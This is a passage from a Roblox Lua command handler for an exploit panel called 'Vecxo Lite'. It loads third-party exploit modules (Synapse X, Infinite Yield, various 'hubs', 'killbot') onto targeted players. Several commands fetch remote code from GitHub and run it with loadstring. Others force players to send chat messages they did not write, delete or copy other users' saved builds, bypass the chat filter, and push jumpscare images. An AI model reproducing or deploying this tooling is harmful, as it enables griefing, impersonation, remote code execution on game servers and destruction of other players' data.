		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Worm hole device ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!sledgehammer" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(8038037940).CLoad(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running sledgehammer on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Sledgehammer ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!tazer" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(13556064399).bzzt(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running tazer tool on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran tazer tool on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!monarch" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(2945942634):Fire(plr.Name, "hack")
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running monarch on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran monarch on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!killbot" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(110756170974672).killbot(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running kill bot on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran kill bot on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!sentinel" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(4661847142).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Chronos sentinel on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran Chronos sentinel on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!provac" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(4932480712).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Pro vacuum on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Pro vacuum ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!afk" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if afk[plr.Name] then return end
			afk[plr.Name] = plr
			local ps = plr.Character.HumanoidRootPart.CFrame

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v.Volume = 0
					end
				end
			
				game.DescendantAdded:Connect(function(v)
					if v:IsA("Sound") then
						v.Volume = 0
						v:GetPropertyChangedSignal("Volume"):Connect(function()
							if v.Volume ~= 0 then
								v.Volume = 0
							end
						end)
					end
				end)

			]]

			if plr.PlayerGui then
				local s = Instance.new("ScreenGui", plr.PlayerGui)
				s.ResetOnSpawn = false
				s.Name = "AFK"
				scr.Parent = s
			else
				notifyv3(sender, "[Vecxo Lite]:", "Failed to give you the sound muter, You may hear sounds.")
			end

			scr.Enabled = true

			local function wait4char()
				if not plr.Character then
					plr:LoadCharacter()
					repeat task.wait() until plr.Character
				end
			end

			while afk[plr.Name] do

				wait4char()

				local char = plr.Character
				if char then
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if hrp then
						if (hrp.CFrame.Position - ps.Position).Magnitude >= 0.1 then
							hrp.CFrame = ps
						end
					else
						plr:LoadCharacter()
						task.wait(0.5)
						char = plr.Character
						hrp = char and char:FindFirstChild("HumanoidRootPart")
						if hrp then
							hrp.CFrame = ps
						end
					end
				else
					wait4char()
				end

				if not plr.Character:FindFirstChild("AntiTouch") then
					local v = Instance.new("Part", plr.Character)
					local w = Instance.new("WeldConstraint", v)
					v.Transparency = 1
					v.Size = Vector3.new(5,6,5)
					v.Name = "AntiTouch"
					v.CanCollide = true
					v.Locked = true
					v.CFrame = plr.Character:WaitForChild("HumanoidRootPart").CFrame
					w.Part0 = v
					w.Part1 = plr.Character:WaitForChild("HumanoidRootPart")
					v.Touched:Connect(function(t)
						local c = t.Parent
						local cn = c.Name
						if cn == plr.Name then return end
						if not c:FindFirstChild("Humanoid") then return c.Parent end

						if c:FindFirstChild("HumanoidRootPart") then
							local b = Instance.new("BodyGyro", c.Torso)
							b.MaxTorque = Vector3.new(-15e30, -15e30, -15e30)
						else
							game.Players:FindFirstChild(cn):LoadCharacter()
							local b = Instance.new("BodyGyro", c.Torso)
							b.MaxTorque = Vector3.new(-15e30, -15e30, -15e30)
						end
					end)
				end

				if not plr.Character:FindFirstChild("Head"):FindFirstChild("AFK") then
					local b = Instance.new("BillboardGui", plr.Character:WaitForChild("Head"))
					local t = Instance.new("TextLabel", b)
					b.Size = UDim2.new(0, 50, 0, 50)
					b.ExtentsOffset = Vector3.new(0, 1.2, 0)
					b.Name = "AFK"
					t.Size = UDim2.new(0, 50, 0, 20)
					t.BackgroundTransparency = 1
					t.Text = "[ AFK ]"
					t.TextSize = 20
					t.Font = Enum.Font.SourceSansBold
					t.Name = "TEXT"
				end
				task.wait()
			end
		end
	elseif cmd == "!unafk" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if sender.UserId ~= 36373784 then
				if sender.Name ~= plr.Name  then
					notifyv3(sender, "[Vecxo Lite]:", "You can not unafk this player")
					return
				end
			end
			if afk[plr.Name] then
				afk[plr.Name] = nil
			end
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character.Head:FindFirstChild("AFK") then
				plr.Character.Head:FindFirstChild("AFK"):Destroy()
			end
			if plr.Character and plr.Character:FindFirstChild("AntiTouch") then
				plr.Character.AntiTouch:Destroy()
			end
			if plr.PlayerGui and plr.PlayerGui:FindFirstChild("AFK") then
				plr.PlayerGui.AFK:Destroy()
			end

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v.Volume = 1
					end
				end

			]]

			if plr.PlayerGui then
				scr.Parent = plr.PlayerGui
			else
				notify(sender, "[Vecxo Lite]:", "Failed to give you the sound unmuter, You may not hear sounds.")
			end
			scr.Enabled = true
		end
	elseif cmd == "!volume" then
		handled = true
		local vol = args[2]
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Sound") then
				if not v:IsDescendantOf(game:GetService("ReplicatedStorage")) then
					v.Volume = vol
				end
			end
		end
	elseif cmd == "!pitch" then
		handled = true
		local pit = args[2]
		if game:GetService("Workspace"):FindFirstChild("Sound") then
			game:GetService("Workspace"):FindFirstChild("Sound").PlaybackSpeed = pit
		end
		local sound = game:GetService("Workspace"):FindFirstChild("Sound")
		if sound then
			sound.PlaybackSpeed = pit
		end
	elseif cmd == "!iy" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local success, err = pcall(function()
				require(87631077502363).load("IY")
			end)
			if err then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Infinite yield failed to load")
			else
				if plr.PlayerGui then
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr.PlayerGui
				else
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("IY"):Clone().Parent = plr:WaitForChild("PlayerGui")
				end
			end
		end

	elseif cmd == "!chat" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local msg = table.concat(args, " ", 3)
		for i, plr in ipairs(targets) do
			if table.find(exclusivewl, sender.Name) then
				if plr.Name == "Reloxz" then
					warn(sender.Name .. " is not allowed to make Reloxz chat.")
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command on higher ranked users!")
					continue
				end
			else
				if table.find(exclusivewl, plr.Name) then
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command on higher ranked users!")
					continue
				end
			end

			if _G.sudo then
				_G.sudo(plr.Name, msg, "all")
			else
				if _G.say and typeof(_G.say) == "function" then
					_G.say(plr.Name, msg)
					return
				else
					_G.say = function(p, m)
						p = game.Players:FindFirstChild(p)
						if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
							local ticking = tick()
							require(gamegoog).load() -- goog reader
							repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
						end

						local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)

						if not goog then
							warn("goog failed to be added, command cannot continue")
							return
						end

						local scr = goog:FindFirstChild("Utilities").Client:Clone()
						local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

						loa.Parent = scr
						scr:WaitForChild("Exec").Value = string.format([[

						game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("%s")

						script:Destroy()

					]], m)

						if p.Character then
							scr.Parent = p.Character
						else
							scr.Parent = p:WaitForChild("PlayerGui")
						end

						scr.Enabled = true
					end
					_G.say(plr.Name, msg)
				end
			end
		end

	--[[elseif cmd == "!buildsteal" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
		if not shared._DEK then
			notify(sender, "[Vecxo Lite]: ", "shared._DEK not found, importing..", 2)
			local success, result = pcall(function() -- decryptionite's build loader
				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/DekKAHBuildAPI")
			end)

			if success then
				local content = result
				local loaded, fail = loadstring(content)
				if loaded then
					loaded()
				else
					notify(sender, "[Vecxo Lite]: ", "loaded shared._DEK")
				end
			else
				notifyv3(sender, "[Vecxo Lite]: ", "Failed to load shared._DEK")
			end
		end

		shared._DEK.Steal = nil

		function shared._DEK:Steal(Operator:number,OperatorSlot:number,Victim:number,VictimSlot:number) -- fix 4 kohles (allow 0)

			if not (Operator or Victim) then
				return
			end

			local RemoteParts = shared._DEK:GetStore(Victim,VictimSlot)
			if RemoteParts then
				local StolenParts = shared._DEK:LoadParts(RemoteParts,false)

				shared._DEK:SaveParts(StolenParts,Operator,OperatorSlot) -- Operator should be a UserId now.

			end

		end

		local plr = args[2]
		local plrid
		local plrslot = args[3]
		local pslot
		local target = args[4]
		local targetid
		local targetslot = args[5]
		local tslot

		if targetslot == "0" then
			tslot = nil
		end

		if plrslot == "0" then
			pslot = nil
		end

		if plr == "me" then
			plr = sender.Name
		end

		local argt = GetPlayers(args[2], sender)

		if #argt > 0 then
			plr = argt[1].Name
			print('name of plr that wants build '..plr)
		end

		local success, fail = pcall(function()
			plrid = game.Players:GetUserIdFromNameAsync(plr)
		end)

		if fail then
			notify(sender, "[Vecxo Lite]: ", "‚ùå Failed to get UserId, is the name correct?")
			return
		end

			local success, fail = pcall(function()
			print(tostring(target))
			targetid = game.Players:GetUserIdFromNameAsync(target)
		end)

		if fail then
			notify(sender, "[Vecxo Lite]: ", "‚ùå Failed to get UserId, is the name correct?")
			return
		end

		local success, fail = pcall(function()
			shared._DEK:Steal(plrid, pslot, targetid, tslot)
		end)

		if success then
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Stole ".. target .."'s build (".. targetslot ..") and saved it to ".. plr .."'s slot (".. plrslot ..")")
		end

		if fail then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to steal ".. target .."'s build.")
		end
	end ]]
	elseif cmd == "!image" and args[2] then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local selection = args[3] and args[3]:lower() 
		local spam = args[4] and args[4]:lower() == "true" 

		local function showImage(plr, imageId)
			local sgui = Instance.new("ScreenGui")
			sgui.IgnoreGuiInset = true
			sgui.Parent = plr.PlayerGui

			local clyde = Instance.new("ImageLabel")
			clyde.Size = UDim2.new(1, 0, 1.1, 0)
			clyde.BackgroundTransparency = 1
			clyde.Image = "rbxassetid://" .. imageId
			clyde.ZIndex = 10
			clyde.Visible = true
			clyde.Parent = sgui

			if not game:GetService("ServerScriptService"):FindFirstChild(varName) then
				local ticking = tick()
				require(gamegoog).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild(varName) or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild(varName)
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://270145703"
			sound.Volume = 5
			sound:Play()
			sound.Ended:Connect(function()
				sound:Destroy()
				script:Destroy()
			end)
		]]
			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			task.wait(0.7)

			local tween = TweenService:Create(
				clyde,
				TweenInfo.new(0.7, Enum.EasingStyle.Linear),
				{ ImageTransparency = 1 }
			)
			tween:Play()
			tween.Completed:Wait()

			sgui:Destroy()
		end

		for _, plr in ipairs(targets) do
			if selection == "random" then
				if spam then
					coroutine.wrap(function()
						for i = 1, 5 do
							task.wait(0.2)
							local imgId = getRandomImageId()
							showImage(plr, imgId)
						end
					end)()
				else
					local imgId = getRandomImageId()
					coroutine.wrap(function()
						showImage(plr, imgId)
					end)()
				end
			else
				local isId = tonumber(selection) and selection:match("^%d+$") ~= nil
				local id
				if isId then
					id = selection
				else
					id = imageIds[selection]
					if not id then
						notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Unknown image name '" .. tostring(selection) .. "'")
						return
					end
				end
				coroutine.wrap(function()
					showImage(plr, id)
				end)()
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Images sent too " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!buildload" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end

		if no ~= true then
			local targetid = args[2]
			local targetslot = args[3]

			if targetslot == "0" then
				targetslot = nil
			end

			if targetid == "me" then
				targetid = sender.Name
			end

			local argt = GetPlayers(args[2], sender)
			if #argt > 0 then
				targetid = argt[1].Name
			end

			local success, result = pcall(function()
				return game.Players:GetUserIdFromNameAsync(targetid)
			end)

			if success then
				targetid = result
			else
				notify(sender, "[Vecxo Lite]: ", "‚ùå Failed to get UserId, is the name correct?")
				return
			end

			if not shared._DEK then
				notify(sender, "[Vecxo Lite]: ", "shared._DEK not found, importing..", 2)
				local success, result = pcall(function()
					return loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/DekKAHBuildAPI"))()
				end)
				if success then
					local content = result
					local loaded, fail = loadstring(content)
					if loaded then
						loaded()
					else
						notify(sender, "[Vecxo Lite]: ", "Loaded shared._DEK")
					end
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to load shared._DEK")
					return
				end
			end

			local success, fail = pcall(function()
				shared._DEK:Load(game:GetService("Workspace"), targetid, targetslot)
			end)

			if success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully loaded build from user ID ".. targetid .." (slot ".. (targetslot or "default") ..") into Workspace.")
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to load build from user ID ".. targetid ..".")
			end
		end
	elseif cmd == "!buildremove" and args[2] then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targetid = args[2]
			local slot = args[3]
			if slot == "0" then
				slot = nil
			end

			if slot == nil then
			elseif slot == "all" then
			else
			end

			if targetid == "me" then
				targetid = sender.Name
			end

			local argt = GetPlayers(args[2], sender)
			if #argt > 0 then
				targetid = argt[1].Name
			end

			local success, fail = pcall(function()
				targetid = game.Players:GetUserIdFromNameAsync(targetid)
			end)

			if fail then
				notifyv3(sender, "[Vecxo Lite]: ", "Failed to get UserId, is the name correct?")
				return
			end
			if not shared._DEK then
				notifyv3(sender, "[Vecxo Lite]: ", "shared._DEK not found, importing..", 2)
				local success, result = pcall(function()
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload_v1.lua")
				end)
				if success then
					local loaded, fail = loadstring(result)
					if loaded then
						loaded()
					else
						notifyv3(sender, "[Vecxo Lite]: ", "Failed to load shared._DEK")
						return
					end
				else
					notifyv3(sender, "[Vecxo Lite]: ", "Failed to fetch shared._DEK script")
					return
				end
			end

			if slot == "all" then
				local deleted = 0
				for i = 1, 11 do
					pcall(function()
						shared._DEK:Delete(targetid, tostring(i))
						deleted += 1
					end)
				end
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully wiped all slots (1‚Äì11) for "..targetid.." ["..deleted.." slots]")
			else
				local success, fail = pcall(function()
					shared._DEK:Delete(targetid, slot)
				end)

				if success then
					notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully removed build from "..targetid..(slot and " (slot "..slot..")" or " (kohls slot)"))
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Failed to remove build from "..targetid)
				end
			end
		end
	elseif cmd == "!cage" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local character = plr.Character
			if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
			local root = character.HumanoidRootPart
			local cageModel = Instance.new("Model")
			cageModel.Name = "Cage_" .. plr.Name

			local cageWidth = 8
			local cageHeight = 10
			local cageDepth = 8
			local barThickness = 0.3
			local barSpacing = 0.6
			local cageCF = root.CFrame * CFrame.new(0, 0, 0)

			local TweenService = game:GetService("TweenService")

			local function risePart(part, targetCFrame, delay)
				part.CFrame = targetCFrame * CFrame.new(0, -50, 0)
				task.delay(delay or 0, function()
					local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
					TweenService:Create(part, tweenInfo, {CFrame = targetCFrame}):Play()
				end)
			end

			local function makeBarsWall(length, height, offsetCF, horizontal)
				local count = math.floor(length / barSpacing)
				for i = 0, count do
					local bar = Instance.new("Part")
					bar.Anchored = true
					bar.CanCollide = true
					bar.Transparency = 0.4
					bar.Color = Color3.new(0, 0, 0)
					bar.Material = Enum.Material.SmoothPlastic
					if horizontal then
						bar.Size = Vector3.new(barThickness, height, barSpacing)
						bar.CFrame = offsetCF * CFrame.new(-length/2 + i * barSpacing, 0, 0)
					else
						bar.Size = Vector3.new(barSpacing, height, barThickness)
						bar.CFrame = offsetCF * CFrame.new(0, 0, -length/2 + i * barSpacing)
					end
					bar.Parent = cageModel
					risePart(bar, bar.CFrame)
				end
			end

			-- Floor
			local floor = Instance.new("Part")
			floor.Size = Vector3.new(cageWidth, 1, cageDepth)
			floor.Anchored = true
			floor.CanCollide = true
			floor.Transparency = 0.4
			floor.Color = Color3.new(0, 0, 0)
			floor.Material = Enum.Material.SmoothPlastic
			floor.CFrame = cageCF * CFrame.new(0, -cageHeight/2, 0)
			floor.Parent = cageModel
			risePart(floor, floor.CFrame)

			local ceiling = floor:Clone()
			ceiling.CFrame = cageCF * CFrame.new(0, cageHeight/2, 0)
			ceiling.Parent = cageModel
			risePart(ceiling, ceiling.CFrame)

			makeBarsWall(cageWidth, cageHeight, cageCF * CFrame.new(0, 0, cageDepth/2), true)
			makeBarsWall(cageWidth, cageHeight, cageCF * CFrame.new(0, 0, -cageDepth/2), true)
			makeBarsWall(cageDepth, cageHeight, cageCF * CFrame.new(cageWidth/2, 0, 0), false)
			makeBarsWall(cageDepth, cageHeight, cageCF * CFrame.new(-cageWidth/2, 0, 0), false)

			cageModel.Parent = workspace

			task.delay(1.2, function()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					plr.Character:PivotTo(cageCF)
				end
			end)

			plr.CharacterAdded:Connect(function(char)
				task.wait(0.8)
				local hrp = char:FindFirstChild("HumanoidRootPart")
				if hrp and cageModel and cageModel.Parent then
					char:PivotTo(cageCF)
				end
			end)

			_G.cagedPlayers[plr] = {
				cageModel = cageModel,
				center = cageCF.Position,
				width = cageWidth,
				depth = cageDepth
			}

			coroutine.wrap(function()
				while _G.cagedPlayers[plr] and _G.cagedPlayers[plr].cageModel.Parent do
					task.wait(0.8)
					local char = plr.Character
					if char and char:FindFirstChild("HumanoidRootPart") then
						local pos = char.HumanoidRootPart.Position
						local center = _G.cagedPlayers[plr].center
						local bounds = Vector3.new(cageWidth / 2, 100, cageDepth / 2)
						local offset = (pos - center)

						if math.abs(offset.X) > bounds.X or math.abs(offset.Z) > bounds.Z then
							char:PivotTo(CFrame.new(center))
						end
					end
				end
			end)()
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Caged " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!alpcas" then
		handled = true
		local int = tonumber(table.concat(args, " ", 2))

		if int <= 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "You need to provide a number higher than 0!")
			return
		end

		if int > 1000 then
			notifyv3(sender, "[Vecxo Lite]: ", "Due to server crashing the limit is 1000")
			return
		end

		if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			for i = 1, int do
				local p = Instance.new("Part", workspace)
				p.Name = "Alpaca"
				p.Size = Vector3.new(10, 10, 10)
				p.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-10, 10), 20, 0)
				local m = Instance.new("SpecialMesh", p)
				m.MeshId = "rbxassetid://273347765"
				m.TextureId = "rbxassetid://273347862"
				m.Offset = Vector3.new(0, 2, 0)
				m.Scale = Vector3.new(10, 10, 10)
			end
		end
	elseif cmd == "!sens" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(137100565686490)(plr.Name)
				end)
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Sensation hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!synapse" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					require(14054360928).Synapse(plr.Name)
				end)
				if fail then
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Synapse X failed to load: ".. fail)
				end
			end
		end
	elseif cmd == "!nfchat" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local success, fail = pcall(function()
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Lime green", 2)
				end)
				require(72038102328619)
			end)
			if not success then
				notify(sender, "[Vecxo Lite]: ", "‚ùå Failed to insert no filter chat " .. fail)
				return
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ No filter chat has loaded", 2)
			end
		end
	elseif cmd == "!legacychat" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local success, fail = pcall(function()
				task.spawn(function()
					GraphicalEffects.CrystalRing(sender, "Lime green", 2)
				end)
				require(10868847330):pls(sender.Name)
			end)
			notify(sender, "[Vecxo Lite]: ", "Go to Hub on exser, password is c00lkidds, and hit Chat bypass(One time) to fully enable legacy chat")
			if not _G.sudo then
				local success, fail = pcall(function()
					require(97248613655645).Run()
					notifyv3(sender, "[Vecxo Lite]: ", "Inserting _G.sudo")
				end)
				task.spawn(function()
					task.wait(5)
					if not success then
						notify(sender, "[Vecxo Lite]: ", "Failed to insert _G.sudo: " .. fail)
						return
					else
						notifyv3(sender, "[Vecxo Lite]: ", "_G.sudo has been inserted.", 2)
					end
				end)
			end
			game:GetService("TextChatService").ChatWindowConfiguration.Enabled = false
			game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = false
			local message = Instance.new("Hint", workspace)
			local dots = 0
			local running = true
			task.spawn(function()
				while running do
					dots = (dots % 3) + 1
					message.Text = "[Vecxo Lite]: ‚úÖ Loading Legacy chat" .. string.rep(".", dots)
					task.wait(0.3)
				end
			end)
			task.wait(5)
			notify(sender, "[Vecxo Lite]: ", "Once you have done the steps to enable legacy chat and want to get rid of Exser, go to the execetor section and type in ExLib.ADZ() to get rid of exser")
			task.wait(5)
			message:Destroy()
			_G.filtermode = true
			task.spawn(function()
				while task.wait() do
					_G.badwords = {}
				end
			end)
		end
	elseif cmd == "!stratosphere" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(6535776034).load(plr.Name)
				end)
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Stratosphere hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!happyhub" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Lime green", 2)
					end)
					require(78790302691160):Hload(plr.Name)
				end)
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Happy hub hub ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
	elseif cmd == "!adonis" then
		handled = true
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You are not authorized to run this command, only the top admins can access this!")
		end
		if AdonisRan == true then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Adonis has already been ran on this server by "..AdonisRunner)
			return
		end
		if no ~= true then
			local targets = GetPlayers(args[2], sender)
			for i, plr in ipairs(targets) do
				if AdonisRan ~= true then
					AdonisRan = true
					AdonisRunner = sender.Name
					local success, fail = pcall(function()
						task.spawn(function()
							GraphicalEffects.CrystalRing(plr, "Lime green", 2)
						end)
						require(4392375106):GetAdmin(plr.name)
					end)
				end
			end
			notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Adonis ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " player(s) successfully"))
		end
